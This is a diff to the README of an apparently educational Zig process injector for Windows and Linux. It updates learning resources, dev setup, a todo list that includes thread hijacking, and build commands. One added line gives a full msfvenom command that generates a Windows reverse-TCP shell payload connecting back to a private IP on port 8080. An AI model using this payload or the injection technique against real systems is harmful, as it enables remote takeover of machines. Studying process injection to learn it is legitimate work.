@@ -4,8 +4,8 @@ Simple Process injector for Windows and Linux written in Zig.
 
 ## DISCLAIMER
 
-This is my first project in Zig, and the purpose is to learn Zig and process injection.
-I don't know yet what to implement, but the first steps are to learn Zig and implement simple DLL injection. Then, I will move on to something similar for Linux, such as LD_PRELOAD hijacking or ptrace-based injection.
+This is my first project in Zig. The goal is to learn Zig and perform process injection.
+I haven't decided what to implement yet, but the first steps are to learn Zig and implement simple DLL injection. Next, I will move on to a similar project for Linux, such as LD_PRELOAD hijacking or ptrace-based injection.
 
 ## Some cool resource for learning Zig and Process Injection
 
@@ -18,20 +18,29 @@ I don't know yet what to implement, but the first steps are to learn Zig and imp
 - [Cool cheasheet (zig_in_depth)](https://codeberg.org/dude_the_builder/zig_in_depth)
 - https://github.com/marlersoft/zigwin32/tree/main
 - https://raw.githubusercontent.com/marlersoft/zigwin32/refs/heads/main/win32/everything.zig
-- https://mrscriptx.github.io/devlog/zig/2025/04/30/zig-linking-dear-imgui.html
+- https://black-hat-zig.cx330.tw/
+- https://privdayz.com/tools/shellcode-gen
 
-For linux on arch install: mingw-w64-headers,mingw-w64-gcc
-For work the clangd lsp from zed i am using the compile_flags.txt file
+## Dev
+
+- Zig Version: 0.15.1
+- OS: Arch Linux
+- IDE: Zed
+- LSP: zls and clangd
+
+Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc
 
 ## Todo:
 
 - [x] PoC
 - [x] Resolution of relative path to absolute path
 - [x] Search process by name
-- [ ] First base with IMGUI
-...
+- [x] Implement arguments parsing
+- [ ] Thread Hijacking
+  - [ ] Implement search by name also in Thread Hijacking
 
 ## Command:
 
-Compile: `zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
-Test: `zig build test -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
+- Compile: `zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
+- Test: `zig build test --summary all`
+- Shellcode generatore `msfvenom -p windows/shell_reverse_tcp LHOST=172.19.192.194 LPORT=8080 -f hex`
